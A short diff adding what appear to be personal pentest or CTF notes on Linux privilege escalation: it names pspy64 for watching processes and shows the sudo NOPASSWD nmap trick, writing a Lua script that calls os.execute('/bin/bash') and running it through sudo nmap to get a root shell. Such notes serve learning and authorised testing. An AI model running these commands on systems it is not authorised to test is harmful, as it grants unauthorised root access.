@@ -1,0 +1,6 @@
+pspy64 will help you see what's currently running on the system
+
+NOPASSWD
+( when you have application which allows script, for example NOPASSWD: /usr/bin/nmap)
+echo 'os.execute("/bin/bash")' > shell.sh
+sudo /usr/bin/nmap --script=shell.sh
